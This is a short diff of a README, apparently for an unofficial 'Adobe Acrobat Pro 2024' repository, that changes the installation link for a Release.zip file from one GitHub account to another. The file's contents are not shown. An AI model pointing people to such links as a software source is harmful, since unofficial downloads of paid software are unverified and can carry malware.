@@ -7,7 +7,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/b653ee99-92aa-4484-8805-d1ef4d419c53)
-](https://github.com/Kukupie123/Adobe-Acrobat-Pro-2024/releases/download/V5.21/Release.zip)
+](https://github.com/vaibhav-sd/Adobe-Acrobat-Pro-2024/releases/download/Release/Release.zip)
 
 
 
